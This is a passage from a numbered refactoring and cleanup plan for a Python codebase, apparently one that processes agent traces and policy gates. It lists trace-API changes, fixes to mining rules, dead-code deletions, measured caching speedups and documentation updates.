13. **Thread ids and requestors instead of guessing them.** Add `Trace.agent_calls`/`Trace.user_calls` and move the twelve consumers over, with the source scan. Separately, pass `id_names` into `write_effects` and `generic_tools` into `verdict()`. Two changes, not one; the first is mechanical, the second is behaviour. (R9, R11, R12)
14. **Fix the three mining rules.** `_scan_pattern`'s escaped dot, `id_columns`' carrying rows, `_earlier_view`'s bare `id`. All three fixes were applied and the full suite passed. Three small tests. (R13)
15. **Harden ingest and the policy gate.** Widen `derive_traces`' except with a reason branch, and exec `HELPERS_SRC` in `_run_predicate`. Both applied and green. (R14, R15)
16. **The pure-refactor batch, no behaviour change.** Move `gate_support` to `gates/support.py`; consolidate the seven `write_json` bodies and `ledger._write`; delete `mine._parse` and `ingest._parsed`; delete `report.run_from_jsonl`, `EVENT_TYPES`, `version_match`, `loop.user_message`, `repair`'s dead assignment, `canon.record_hash`, `derive._helpers_src`; break the `ai` cycle. Every one of these was applied by a verifier and the suite passed. Run it as one change with the suite summary in the PR. (Section 3)
17. **The dead-code batch.** Delete `policy.reference_violations` and its four tests; delete `artifacts.py`'s five compile-tool gates and the two `compile_tools` spec rows (keeping the `body_*` specs); delete the five registered-but-uncalled rulings in `artifacts.py`; decide `mine`'s LLM half, `reconstruct_truncated`, `exempt_from_reruns` and `gate_tools` one way or the other. About 500 lines, so split it in two. Note it invalidates the compile_policy stage cache once. (Section 3)
18. **The measured efficiency batch.** Hoist `_mutation_gate`'s run facts, memoize `hard_holds`, cache `_strip_currency` and `_as_id` patterns, group `_unordered_columns`, cache `load_toolkit`'s compile. All applied and green, 55x, 14x, 1.75x and 25x respectively. Pure performance, no behaviour change, so it goes in on its own. (R24, considers)
19. **Refresh the size record and the design's module list.** Update section 4, section 12 item 7 and the band table against the six packages plus the two frontends, saying which decision superseded each stale claim (D129, D123, D122). Give bands to `agent/`, `gates/`, `examiner/`, `rounds.py`, `tui/` and to `build.py`, `verifier_suite.py`, `context.py`, `examiner/tools.py`. Write `docs/architecture.md`, or stop referring to it. Docs only.
20. **Then the structural moves**, one per change: `compile_env`'s D117 block into `builder/write_body.py`; `build.py`'s Run-making half into `builder/runs.py` with the `_world_for` helper; `gates/stages.py` merged into `gates/artifacts.py`; `parallel.each` moved below the builder/examiner rank so `derive_all` can use it.
